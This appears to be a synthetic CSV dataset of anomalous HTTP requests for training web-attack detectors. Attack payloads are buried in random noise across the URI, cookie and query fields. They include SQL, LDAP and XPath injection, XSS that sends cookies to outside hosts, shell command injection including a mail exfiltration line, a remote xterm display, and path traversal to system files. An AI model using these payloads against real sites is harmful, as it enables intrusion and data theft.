Class,Method,URI,Host-Header,Host,Connection,Accept,Accept-Charset,Accept-Language,Cache-control,Cookie,Pragma,User-Agent,Content-Length,Content-Type,POST-Data,GET-Query
Anomalous,POST,/nMlwget7pD3WaPOUME/uMJcOFrtF/dlegetduha1ve9Dprnhm/vorsrtpwuM/samTfqJCAwindow.openiw0ibz/jiQD-cJmAwluPd1NF2Q/rauhorkn/gcnirebnp/eUAhrc@8tnPG/8fV9o/rq7DSWTpmx.t7W.swf,HTTP/1.1,www.tlsyt.gov,er9tr,*/*,iso-8859-8-i;q=0.4,*,max-stale,hh9er=taesv'h4;eaeacta=wosDnristdin;evalg-U-.passwd=)( |    (displayName=had*)  (name   =    had* )(  mail=had*  );Ubs=latns5ohN;kntlAepi4mitmb=Et@'mtdlinkapobs,,lsh1hs (w7Chxas7; 6ysquBzO0y; evaUl5e; d.68-lNyr; svEMNG),162,application/x-www-form-urlencoded,nmrmdhus=gs&tOtee3a=dn&ongathIuehor=nxeIp&yos6o16s=iwyt&sau6ssh=valwherei4/&atjEeehap0a=6&or33=9i(d&1etpnhadSHi=044955027&eoitohhir=lDanuil d+i8nnenull]en,
Anomalous,GET,/enodew5a-connectqc4WWJX-/T6/cvuEX5P3owbAnetcat2b/aph6a7ht27tet.gif,HTTP/1.1,164.36.106.206,keep-alive,*/*,"utf-7;q=0.3, koi8-r;q=0.0",*,only-if-cached,tnrt4yDh=2322283835;YmQ77netcathtpass=lNtetiadmql;mA4frqinelLtb=87;7tphod7yuc=iZTH9j7V;efaesfd=nm&tncopen4emwtl]aechoe?i,cyr=omapefe,Mozilla/4.3 (Machintosh; U; PPC Mac OS X 1.1; to-ni; rv:1.2.1) Gecko/02317336,,,,jo1nte8E=OR+++%27n2ggntE%27+++BETWEEN+%27R%27+AND++%27T%27&nreinabitbkene=pamx%27la&5f7ss=78&en3=78825&9mitoIez=918&fWnbanehedriby2=onnDvbscript&kesgnmeboiEbfy=nh1Hlitnwibiiac&3P=gk3aQHH
Anomalous,GET,/hsUNroolRn/IvmneisTv/1eo1y3taasiasrheap/rCc/hrl9nw0meietv0T/mhI/ee3OSeDCHmAp.tiff,HTTP/1.1,42.165.87.243:80993,close,"audio/*;q=0.0, application/*",*,"Nutroe-Rx5;q=0.3, bnz-iWAm",,e3iriMedth=81.199.182.66 |  dir,no-cache,Mozilla/5.0 (Machintosh; U; Mac OS X 1.2; u1-hn; rv:6.2.1) Gecko/61614103,,,,iulnr=aT0AT2w-psQ&aeeernlAoit=ooe&e2nirhinyota=citlocationtsIld&ei4boOa3i3o=khdnunionooi%5Cm+d+dZNf0au
Anomalous,GET,/ssi/envout.bat,HTTP/1.1,www.a2amuin.net,keep-alive,"audio/x-wav, text/*, text/xml","gb2312;q=0.3, big5;q=0.3, euc-cn;q=0.4","sek-YhnnSeeu, b-ygttisv;q=0.2",min-fresh=39545,oA6l2zdhopon=433991;stdinJOTmhv6j=2$;ei1onAnsiSnletl=7e2Nscript+dyud9c:ta,no-cache,afOir/4.5.3.4,,,,|dir%20..............1
Anomalous,GET,/i5nWnQ1pWBdKBGYyG/RksH/g113@/naetxd/nTN9lKqFv-ZzgGlh2.dll,HTTP/1.0,185.37.152.184,keep-alive,"application/*;q=0.8, audio/basic;q=0.5",*;q=0.1,*;q=0.1,no-store,ehRewttg=9687;shAaesssS=iI37-PN9;ttvNohEf1=q;x2B2hhe=464706319;eoid4soih=catisam h/ci~a[e,no-cache,owsinxmodapkv4mc,,,,lso7=le1HeB3BbLS7&2s=+%3B++echo++++%3Bw+++%3B+uname+-a++++%3B+++++id&symi=eloi6attboot.inieiaO&n9ot=+babaonaR2o&pai=n2vn8BTtxf&cteoenzaLea=hH%3Fah7u&bnunhgWwsbI=24850
Anomalous,GET,/euswalllrulXiraa4n/6oiBcNyCntM/tk18FZ2F/dsrsIeueb8ton9ee/l19ftrkaFmqY/bGTewindow.openPorzl.exe,HTTP/1.1,www.fsrccUsns.gov,close,*/*;q=0.6,iso-10646-ucs-2,*,max-age=95040,@B1OFPmeHDH=2;coA4sEtfnsorlr=itnmetant(<;witqb,jntdishi=r,57pBi/0.1,,,,edblseEetlmoFr=aV-tBnnwPDP&iyiporTt=gSaet%29z&eTg@99J=jre&oaJalike.Z=015&gtgcshdwotexad=3&dXW7ouZ=m2T2qi8knQb&rcpwindow.openy7Ub=n3Luw0c6t&kIEywzrKF3XT=rvvnasgLaa&ln0=n&eco=3bep2lhe&AkTahillnDIefeL=8&8bre9=%27+%3Bcat+++%2Ftmp%2Fres+++mail++totret%40rell.com++++%3B
Anomalous,GET,/sde4cn/dg9Rewna3ransseittrV/xjs/dhntEtln/shi92tlet7dwtiiae/mpenJez/e20qzHF/5erEitblcEh0/b6epdiqromitEzgencu/gEFnetcatcnJAQ.nsf,HTTP/1.1,42.48.11.49,close,*/*,*;q=0.9,"xt5a4l-o, oio-sReo;q=0.1, ueey3iat-rdws, rrvodaa-5pohtdh2;q=0.8",no-cache,ightNeedzele=k;ntteh2n=794;OEQlQM=n8pelShoreersaeRs;est=h ;4JO2=tQaMot-zsENP;qWa6wwbtlaa=148071,esannB=eoOt9ke,ettpid0ry (uS_XAr),,,,etandiEe1m=gde&h0aupqtl=077&jTsJibx4=iTG&sehftets=h%40U%24st+r&iludGshdfu6=63&h1W6=telnetn&qBfusrwV_PR=slath&Cntctn=76988&I29pmnfvYt.E=eTiwrfG+wi6dR&iruciaeeOrrx=325055355&ee=%3C%21--+--+--%3E%3Cscript+%3E%5Bwindow.open%28%27http%3A%2F%2F84.56.146.85%2Falri.php4%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+%3E%3C%21--+--+--%3E
Anomalous,GET,/sHu@/2WuRdqYgj/io/mHDpXmBo2a7OYbVIbXL/ffkHD5z4wU4H90.CoF54.css,HTTP/1.1,www.et0wl.cz,iadnOEq,*/*;q=0.9,"iso-8859-9;q=0.2, cp-950, iso-8859-4, x-mac-greek, windows-1257","ihiaegrz-eFt, c1polhc-d",no-cache,nocmsIas2rn=912324,sl=nG,Mozilla/0.3 (X11; U; Open BSD i386 1.1; Mn-an; rv:7.6.0) Gecko/46315938,,,,zR_cW4O4RcT=OZ&reubE=49309153&hWL7Z7Rf=%26lefv%25At&YFJ6c=%3C%21--+++%23include++++virtual%3D%22d%3A%5Cwindows%5Cautoexec.bat%22++--%3E&deau=eua7aehdnUAlwmh&dtyAitnh=+b3esck3F8tr&k12j=%27%3Cm+wr%409aes&osfe0pte=iftpcxtermTaaimET+ij&uben0ollge=+rwdv0ip6ce1&jh08unanatrhot=tlaffvarocnMne&sh=2zu34d&Dm=12775366&9nAhXHbselectk1=2020949049&Me9P6=5510136644&aeoheoyii7uTad=719
Anomalous,GET,/ibqHejOuKw.6-/ssrssrtdiavl5pg/ss/eY0V.htm,HTTP/1.1,107.125.100.74,w0aAt,*/*;q=0.4,"iso-10646-ucs-2;q=0.9, big5, iso-8859-8-i, x-mac-cyrillic;q=0.5","io-meloizws, 3r-rq9;q=0.1, yc9x2l-oSfoew3l, f-rj, ngr-YnN6a4;q=0.2",no-cache,eceyee=9079492328;os6=nNC._9Cu1hZG;l3ysafmbX=rnpcoraus,be='oyoey',Mozilla/6.4 (Machintosh; U; Mac OS X 7.3; ie-da; rv:0.4.4) Gecko/31771489,,,,eA=%3Cobject+classid+++%3D+%22++++clsid%3A...+%22++codebase++++%3D+++%22++++javascript%3A++++%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.ge.com%2Fcgi-bin%2Fseveat.cgi%27%2Bdocument.cookie%29%3B%5D+++++%22++++%3E&DhiT@OLRcmd=wgrat9IltnF&uEettlaecn=1655&iaFmmzOgsw=ijBNB&dYltat=29170
Anomalous,GET,/ccsofYaneeDul5veto/iEe9igotaz/ejgKjXsZfI6M/dg-dT9BXxb/h3Ca4hrBSJnD/neeoci/ee06soeoi3la/d9gG5/s4jsgU/boeqgemijdq/s6Jja.cfm,HTTP/1.0,191.31.101.164:06,keep-alive,*/*,"windows-1255, iso-8859-5;q=0.9, windows-1257;q=0.9, iso-8859-9;q=0.3, iso-10646-ucs-2","jgjie9-cht12sn;q=0.9, twAe-ewdohs;q=0.0",max-age=90214,ddmoct=ik1;ta0=63;tseqbhcnl4ac=90802;thttpdexecl=9480575;ynNetto=oIshutdownesmZ2/zilysWcate,he=hEe,gtihrktOo (ivi8rB; yuVmqJQ; qdSwBg6; nywnRPjJ; idt0U236),,,,Rnnbtnia4Kctoou=i%3AihonElodtmp&3tdN7d4gsme=ycE1iwb&4stdinz_1binuniond3=a7d0&ne=xteyiTcirnaz&aasnrhflruonjt=nenoe%27+++or++count%28++path%2Fchild%3A%3Anode%28%29%5Bposition%28+++%29%3D%28%28+i+++%2B++j++%2B++++k++++%2Bl+%2B1%29%5D++%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++or+%27eie%27+%3D+++%27++aT0eyyLa%27++or&i6Gfeso5ssqn=nnrrow
Anomalous,GET,/sm/ot60VfpQj/0vQNASMn9bqKgz/n0fdln1/7-1BqMgQ/otm/7Arbx/scnuedierlo/an/dricv0aa6BBWMNjvfcSP/v7ttMHbvOGrOXGLqFg-q.php3,HTTP/1.0,www.eirer9h.com,eeorjt,"text/*;q=0.0, audio/basic;q=0.7",*;q=0.5,deoEr3-hdDQesEe,only-if-cached,sownnr7vyeagt=eIoe;sock_streamI0EjMncN=ts66INndmh2aedeant;tdjn=|:/usr/openwin/bin/xterm+-display+171.196.174.116:0%00;RE7h= i;yeeaatpbeslifl=13;i1pnNc=5,no-cache,vger4aersb2Djsa,,,,
Anomalous,GET,/equTeaeO5LsgHnnei/0xew3oey/rdBheFp/4vn5iDGU@tB/rt_vEoklZm/k.6qduetc11KHJ/iEr4wfdresiqni/uVWPm5s681xjcqw/WCH7tqHkUlWJchildun/erXikvFJ0txdnF-J/f9yAE9SYMhvVKMY-Zsw.cgi,HTTP/1.0,www.nnzan.net,close,image/gif;q=0.7,*;q=0.2,isheoE9-cee,only-if-cached,suehwae7bmhtre=a+se ;nkohnfat=5;ssgfo=uscnvohl;ATgio=hhEz todaluniontmpinputc,tyn1nq='pC3',iH9@mmgG@ http://www.cado.it,,,,vgcgnihgdb3oas=ocD-NxY.lMl&lbautL=4920017&ihf=geGdtnwa6txrt&1eafflehTutse=%27%29%2F**%2FUNIONALL%2F**%2FSELECT%2F**%2F4%2F**%2FFROM%2F**%2F4w7m%2F**%2FWHERE%2F**%2F%28++++%27%27+++%3D++%27++%2F**%2F&qGt8xpceYt3esry=41870215&w4nBethtatueon=874&aiRhr5=de&rrAywiae=i9vrlr&dtae=0607611&x6=+%7Cmailexeclcar&lrEih=%3Fsnullrt%5Bh
Anomalous,GET,/aguyOCY.dMhVMxEJ1/JhAenoCuncet5e/zi/s5N1D/smxIei/homeqWjhjJYbodyNnED/tTzUsxcERB1v9x..L/eesaiyr8oao9etr0neR/dre5H6UOnUYcbK.php,HTTP/1.1,www.aHNe.uk:80,close,"video/*, audio/*, image/*",*,*;q=0.6,no-transform,ntz7oi0s0m==s =y;rt=yOPz_;ahtemhnstos=e-ZnPrN;xZTYuH.YnetcatselectTh=eoo,no-cache,Mozilla/4.1 (X11; U; Open BSD i586 4.7; eu-aa; rv:3.4.9) Gecko/71855007,,,,idsian=33721706&wfixns=%5Dsy%291q%25tRenCbe&atsoertm8lh=wewee&Rr6Sc.=700&neshuhc1eo=%5Cautoexec.bat&drsts5=5&lauhs=tnbou%5Cm&tAf=oftty5
Anomalous,POST,/gi2nerT5ase1h/mLWff-7idrpuP/dIPkPisyKutw/tERlP2koVySg/1wrowYzse15/917EOYW-HpfCoq/ap/oa.msf,HTTP/1.1,87.191.125.122:80,close,audio/basic,*,*;q=0.4,no-store,dluoi4mtghbe8=hrn;Jprocessing-instructionadminNU=maaeewho;dtnAnntofchlrdy=442,ne=taavEa,Mozilla/8.5 (compatible; bb6tsi; Linux i386; aasXoe),267,application/x-www-form-urlencoded,na8shse=xmlr&nsodaae4=4327&rYEb=resiatn&hioegte=ea n5&Ioe=OR     'hrni' LIKE   'Sim%'&aoeN9lrfir=S8nhvaicRsoqltena&dohl==8Jr4iasaito ne&nceBtaiEn4=e<e2ehek)t|e&snp=066330&ej48tn2ebe=6&Ec7Z9=fe&eBwewijsekiurn=0&grs2opU4piv=enQvqxbyE1&lpiaooSbnrcnA=57,
Anomalous,GET,/scripts/file.bat/..,HTTP/1.0,www.aaitenldlp.st:2961,keep-alive,"image/gif;q=0.8, audio/*;q=0.5","windows-1257, iso-2022-jp, iso-2022-jp, iso-10646-ucs-2, iso-8859-2",g-mkgbVEru;q=0.8,max-age=3842,dI2osteaqagde=omavrtjUg;rtlae=pqB5fx2I.j4p;iYLznl@P5GnX=8126;fah7risrf4htp=0139,o8na='dama',Mozilla/2.5 (compatible; MSIE 8.8; Win 9x; ua6ciryme),,,,
Anomalous,POST,/lyT707Ep5U2xtvu680I/qs7aAfVfGtLQXOc/dody/p83ee/t_Qv7/njjco9O578nG@pjv/stylehPQ0vtk.tiff,HTTP/1.0,168.117.197.28:61,close,image/*,"windows-1250;q=0.3, x-mac-icelandic;q=0.7",*,max-age=13,iigdsnnsu5su5tt=' ) UNION     ALL  SELECT 530 FROM   ogz  WHERE  (  ''    = ';xyt3tn9NndDen=frgtw8o;Y6c-ujUwxQ4f=ehttpsnullbl3r5t,no-cache,Mozilla/0.7 (Machintosh; U; PPC Mac OS X 6.7; fs-Sn; rv:2.6.8) Gecko/62220145,117,application/x-www-form-urlencoded,nKy7binI1vOF5Y=eee5i&ntudsseughhn=az]i]accepta&jconnect-Z=lzigecsm&qRuvchaPrjms=0mhU5p_W&nep=t&eitan1djbMiu=Lhuds,
Anomalous,POST,/sXYg3nao.TV/aO0A/iimah24ra/yT3wLIbR/sCy0NY-l1RaJfka/E9t8jedsef3cme9ilo/0D/J6ClQXCRy6/lSevalT5.Q-/ePSsRokcpSLl.png,HTTP/1.0,www.lLetn9o.cz:80,keep-alive,"application/rtf, image/jpeg, application/zip",*,*,max-stale=5953,WnBKelibOGLH=e48dtq;WlinoceLGbI6=ff2SMkD4;cemfx=6594809;i2v=huqaqs taap;nsomsSttdnwIai=ioXG31IV,no-cache,Mozilla/4.0 (X11; U; Solaris 6.1; Cb-ed; rv:2.6.7) Gecko/52216837,170,application/x-www-form-urlencoded,9foN6h9=HI&ou2omrie= ;   echo    ;  w       ; uname   -a    ;  id&uereeest=/borlndia5sc;&8c4apgo4t=e7rLSwnaj&syr4e6etodd=0slebeeftceDkyyw&9LFq=passwdfRafeaygu,
Anomalous,GET,/Oc@6/6admin.ZwhereBN4/o.H@R/IgeouhuwnRe5deua/npcBhawTblJfvL.png,HTTP/1.1,229.23.127.253:8,keep-alive,"audio/*;q=0.8, text/*","utf-7, cp-950;q=0.2, cp-936, windows-1252, windows-1251;q=0.5","HmSerRpa-ng, t-o5iacreE",no-cache,eo0o=servicesisouspnvld>c 0a;ftTrcdph2rben=nlneipasswd&FaLBr i;ab3hewO36=mOynld0;mstjsbestm=mijtNpneegubnl1,rverote='psa',lsqhres9At6eoHer,,,,ibgv2rpeiuw=o&lvtosbyecon=l%26r&shhdp7netoc=esivxml&Ftusue3gihe3Aw=nedtreErnssear&41=susrs&chAoao6=5179&iA09mgteez=+w&XSKi_8k6GLdi=tndicznaEj&pCtl=tts&rrEpurlsseir=ntr%3Elt&bm=%29++++%28+++%7C++%28pe%3D8d*%29&etoerntfronn5w=e5&M8YP0_w=%25tiedv4te1wui
Anomalous,GET,/ffn6aBGH5r/lZZHnV2JNTo1nbfVVK/Tecbeg/e.7a_2jihzLnYn6Z/sH1C05/vvG_yOUJCGtmp0Y4.shtml,HTTP/1.0,66.102.172.159,cuihwf,"image/*;q=0.5, video/*",*;q=0.0,*;q=0.0,max-age=7601,6N-7=sapx2tto;asc=le0tylmthu;NIot5sEpoeoe=69274765;iqan=th2dk,ya=aua,Mozilla/4.1 (compatible; Konqueror/0.2; Linux i386; 7ham; fii1ooASap),,,,ttenicimdx=dnetmaeurite&eawRh=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Ferll%2Fri%2Fleni%2Fnsoranreas.mdb
Anomalous,GET,/gesadneejnThFp8vr7/2PgBPF-0G89cQZ/61TEX0jpxUKWY2MpO/zhCrelirnhnsgrAuti/uNQ4g.html,HTTP/1.0,236.15.84.132,lisoald,"image/png;q=0.5, video/quicktime;q=0.8, video/mpeg;q=0.2","utf-8, euc-tw;q=0.5, us-ascii;q=0.8, windows-1252",*,only-if-cached,eg=8i;meta7CA=i-HF;iOsystem7Vm=wntdo5&9e;emleygdrcnRt=67258735;lrt=wftphopens;guetaoasns7=uhsfni0ct,no-cache,rTtoereo/9.5,,,,wwfaeFz=egeQSmfoo&oee=%7C++ps+-auxwww++%3B&xazttsfrp=cdd
Anomalous,GET,/fTte/hClbwqA/zdSf_RKrOzpasswdSOa/eQUlrz4admin/elxat5sdrnrtteotl/Ad67As_J96VXAm/eSd3k-2f4XQZJ..oHw/X4oid1m5vcs1./aylZ0l/6p6glHndilnw/-jes8447qb/snoEuqnrfo.png,HTTP/1.1,4.238.179.210:62552,ttceyIt,*/*,*;q=0.9,"la6uo-oY, hostsntW-osht;q=0.5",no-cache,0p=tGh3etetuoh,Qbd3hDeU=acrtaxe,naaaiNHsn8/3.5.7,,,,otelilaytetyie=804528750&1cmh7ncde=hGbBTU6HxOB&eTfmt0gi=%3B+++++select+++*+++from+++OPENROWSET%28+++%27SQLoledb%27%2C%27uid%3DweigiaIfi%3Bpwd%3Drnsiepr%3BNetwork%3DDBMSSOCN%3BAddress%3D45.223.250.210%2C43570%3B%27%2C%27select++++*++from++r9Hxydja8%27++++%29&ut=awheresles0%25iejea%24
Anomalous,POST,/iuekToeybhlAew/en8aaie2ln8ed/dnvFklN91CKDY8a.gif,HTTP/1.0,11.204.198.43:80,2rerP,"text/plain;q=0.8, text/*;q=0.7",*,18823 or    z/hRJO/ov1e3/child::node()[position()=6]     or     11878=,max-age=1581,qHi=r2mkjaw;rkEde0csl9ceD=2i,pe='i',Mozilla/6.2 (compatible; Konqueror/8.3; Solaris; n4riasc; 2aomohnoez; h0r75),33,application/x-www-form-urlencoded,ttIohrrfs=httpsi&B0o0otutT=991209,
Anomalous,GET,/ti3abrm/s3lP05oF/4mfawa8nSne/NedestsSaxccdeose/inputMHs/R1yu/tYs/uNnIV9/iTtfgttloo4e/IeeIoes6utYrt.jpeg,HTTP/1.1,www.atimol.de,retiw,*/*,windows-874;q=0.3,*,ntuq=e4ycats,tcfeis47d=noeiG;9eto0=Renbc9;rrmOcedkautD8=me9awls;gMobject5oXR0HR=Oro;autEtaHtynnM2oe=edFz9ahndnem5h;B0wh2kscywttdc=eeb,r0E=uwl,etaigaeeiiFecetau,,,,abuonrtu=h+rr%2BM6hptugyrnodeddI&utwased9zdtapni=arexecjAetmp&qtrseQ=NE+0degscriptw&daTohpiahtkE=319&eBsuAAss9eeos=sflRfx9J&U9ubodyKabFO=5847831&@uxUWl8Nd=tJctAtnHmX&yaoNodml2S7etg=ttm&JwY_=55&HheneE4rmevrlmZ=le&rh=sasi8SsorB&6ndnmaedeiax=%29+++%28+++%7C+++%28displayName%3Dhad*%29+%28name%3D+had*++%29%28++++mail%3Dhad*++++%29&x1dzobdmecw=uJZD7&Oepb0oP=1&mn9ein=0229
Anomalous,PUT,/6ghOtBXdvVu_Rqy.103d/eiagoaHtxsaao/Jy1f/n5S/kgQ0hE3adminh/il/wdFsIvfT/qmTHlkaia2mi/tZNNhT.Ei/tysyeqno/hNol6-p/FVF.jpeg,HTTP/1.0,18.176.27.139,oytdlxjf,*/*,*;q=0.2,*;q=0.5,no-cache,aelibep=93459;an=nedaed7edftxm/l;QOhttpsIDNY=rNtRx.iDOi,dvH1='ewTyetna',Mozilla/5.7 (Machintosh; U; PPC Mac OS X 2.4; 9d-Ey; rv:7.5.6) Gecko/57462508,167,application/x-www-form-urlencoded,rotur1tpfytae=<style    type =   'text/javascript  /'>[alert ('9teb');]</style>&yBtht=u&mq4etre4j=myMT&A4U4NJstyleHopeny5t=di&idoEaru=lh,
Anomalous,GET,/ahiIhn4nl/e2TP3jaovs3UuJ/hrtorertraut4eafhxh/TB/3icebrwteelata6sE/5@TK/hesc/8MDX95Wprocessing-instructionH3.i/okJgy/s%uO9FsQlsAM.sh,HTTP/1.0,www.aisrmon.net:16845,rca0e,*/*;q=0.5,*,*,,nSor0Es=rctt;0ometa_dva=h:\\winnt\\boot.ini;8Lnhae9i=992948921,,OrhbuP/1.9,,,,S7window.open2iGEY.l=vvtt04iatsnwy1&78tthtbkOwspm=ismHF%40s7esecsz&9YqstnDc4ajno=8en&zug=eeele&TttTEclRro2soe=2vj2oeAp&sta=ymhswin&BwAO2=+vhn&uiDb02iPyyMu=includees6o&ahb2poemf=smaSn&eiesio=965868&yfumlbitgtOext=iitesn%3A%5B+ms&eshaot=950750
Anomalous,GET,/cu6eUdQN3v_DIg/baseht5yLs/9C@kOd/mtnraiuIslsviknoyh/eLoabK-ue/asXeWo5.r@SypBX5x_a.swf,HTTP/1.1,231.166.249.163,keep-alive,application/rtf,*,"4a8tEtet-9, szosieSs-t, Heixey-iof3;q=0.0, b-sta7eiar, al29rluw-czyRsqqK;q=0.6",only-if-cached,bpneC4=s47jioUt;iwmWagn=79823;no=esloorr9;iisstyleER251iUK=rOvw.URSn;mto25ai=nef;oqr=85799,t='n2egn',e1_DBmGUJ http://www.utshefan.it,,,,ixingrc=70&l8taie79e=Gto&qVCkshxdd=..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&atooaon=19175
Anomalous,GET,/ihlab90ynfstneto/sNrLjj-RR4QUzXkTP4Co/idtldbnsiofayfht5e/nYE/eqb08hzeSurdhe/iRWWO/_bbhq/stepanhonvi/iAqhbCZNjRtM.cfm,HTTP/1.1,www.twmh.org,jQRasa,"audio/basic, audio/basic;q=0.9","windows-1253, isiri-3342","awi-uiofsEP;q=0.2, i5hr-qAt, eeheoyeo-oge, anksAt-Ia;q=0.9",evasomac=S,of=49,srokA='u',Mozilla/4.9 (compatible; MSIE 0.8; Linux i586; UWih; blfece6dho),,,,pTf=94634455&HkqqcQG=1&nytEzFoeyydGso=e%7Esmxd%5Dh&eSshh1hhliw=Ttaaccess_logpunphrv%7Ern&t6=ltYdocumentaeaen&15@xmlH@=%5Cautoexec.bat&sBdAr=f8P6d%40&nxaixooel=scanEr
Anomalous,GET,/d_Vk9tbS/ovc08ck6csAd4C/hGPYwf5f1TpewKZEr/ev1SsXOjanbb5FnQo/Ods6gn8/ec/sm.AlKqk8fw21LogUp./.YnEK/nWGVYaWYSwlRtVK/ynxamrncnslu.asp,HTTP/1.0,www.tbau.biz:03490,xomthrol,*/*;q=0.5,"iso-8859-6, gb2312;q=0.7, x-mac-roman;q=0.6, iso-8859-6",*;q=0.5,no-store,eYsRssnmIos=eVJZP,no-cache,Betn (7DCYIoe; 1_NirMUL@h; p47dT-gse),,,,mni=ht&na=Ee5FNhhlom3&eerAi=kdl4eRuaa7e&Srtabdhl4=aAi3rryM%27nzriconnectleu&r2aatieef=uh+re5aihene&cmmiy=889&eu=tVNIMvP&sErop9anEat=%5Be&tti=388&c8oo6nez7tlkOeY=qc8k&mtihhrtqpltla=n9mzeh&naTSe=y+alasalri&izdaaFIhTw=adso4n%3A+oethi%3A&xdxOUs_HK=tRsxhDErrsurW7A7q&doG4s=69
Anomalous,GET,/FohtC9bxrloeega/t6/t8pVv4u43AbZYw/anlIn4evrsrisZ/aAi3/i9Cowt/kjeteeanlnlAl.html,HTTP/1.0,179.245.116.96,keep-alive,*/*;q=0.5,"utf-8, iso-8859-2;q=0.7, windows-1253;q=0.7",*,max-stale,gnt73qfo=57;l6=s~ :;icplavsdfwsSnT=z34;nlnnoAGCb6bsvwe=T9haunocldEKqo0r68;ekdzevnaLh=Meconnecte;enrXs=546,no-cache,Mozilla/6.5 (compatible; esobbrade; Unix; tNdjslnt; ifneSsn; polhnait2),,,,pOHO2v=pea&iW=oN&rseOjD0ede=eO2ExVtk&areakynr=82818&e0ieO=09774&gsi4tjefskloLe=7itnB2eobjectm&hu0WOexecnFg=880388217&deeaacy=%2F%2C%2C%2C%2Fdhthhs%2FlU%2Fpasswd&@pKoh@CY=5227847&cdmydnun=eIm3deletetHpi%3E+cBd&rsHytn=e
Anomalous,GET,/drY.BC/sUiSdN6W4f.js,HTTP/1.0,www.pkdi.st,close,*/*,"euc-jp;q=0.6, windows-1252","pdl1et-3a, thehb-atn, m27y-sppsnz;q=0.7, sc0kN-el7eono;q=0.9",no-cache,7replace8D3N=o+g@lbgsound';glXxih=eDDwJ;te=aNAyCrIdxDI,no-cache,Mozilla/1.7 (compatible; MSIE 7.2; SunOS sun4u; nHeoj14; csitpnk),,,,npBphseIom=h1vo40&1btrlTiedsm=%7Emc%3Aasnullhttpti+8pu&hin=select++++h9tSctm++++from+ALL_USERS&aqetb=25807230&9hhhtsQoorewht=322585899&2Ftenppxq2rnIS=szIraNstn&easfi6=ms1QaSEi
Anomalous,GET,/t@rjgRaMnKt@Vih4tF/i4.xBEN8DqT@X.amO/qscte8/sDWteoOatac73/G_-ouqvi5l/rvliEwL/ni0ernutotwcrEecliu/04ZzI@8KpU/cjne.bgpz9.php4,HTTP/1.1,142.40.233.153,ontp,"application/zip;q=0.4, application/x-tar;q=0.9, video/*",x-mac-roman;q=0.4,"eoechiie-enil3Ibd;q=0.0, l-Ln;q=0.1, dA7gp0-onhr, fnd9Oa-esih9",only-if-cached,kcts=ewsff=lttmpmp&y;rdDsn=46;onprdelklo=jservicesor;citn9moP=6151319560,no-cache,rtwiEfst (evt5YH; qWNLBZM; qSB_l4X0; du-tz13CQ),,,,pnhso=5&emftqdrsbriaW=45765217&ttsatsA6eo=a&1THEopt..s=7&seeo9oaNtkdcnow=5t%25S%7E&tctudoe1tbbmrEr=a&hwud=ne%7Eaeexecdocumentadocumentdocumentetissechovbscript%29r&ywncToehCrBytim=n%2Fipohix
Anomalous,GET,/dduceninhhlll/havingXkYusWhxQLVIm/0z/seMXckOI5int.hsOS/gt3fdrsm/munA3a-PFf/AnystsoselaL/tyPwoEPZeXmYxcM3U@wr/r-6uJqO/nn85Ef7ahgfdn.css,HTTP/1.0,44.20.162.199,close,"audio/basic, image/gif;q=0.2","hz-gb-2312;q=0.8, iso-8859-3;q=0.9, x-mac-korean, ks_c_5601-1987, cp-950",ipne-dexie3lt,eeoaC=qeyh,csTJees=ms nandfT$passwdoet rIhE;Ee0hoe=h0UiFFJ1;ia5tl=oA1vcTLjQ6Vr,no-cache,Mozilla/7.1 (compatible; aete; WinNT; aa4prL),,,,8a5eE=or+++++0%3C%3E%28select++++count%28*%29+++++from+++++etk%29&osadktlelI7leep=bwgetebeetltm0aEA%5C8p%28&1rIeeohLi=hllt34caazer7ib&olkone2b8th=eatekTne8t&i4ia=l%40j&klnna3npuist=372648&cswchDcolmct=mgorlemeu%3C&lyt=aHeygq.I
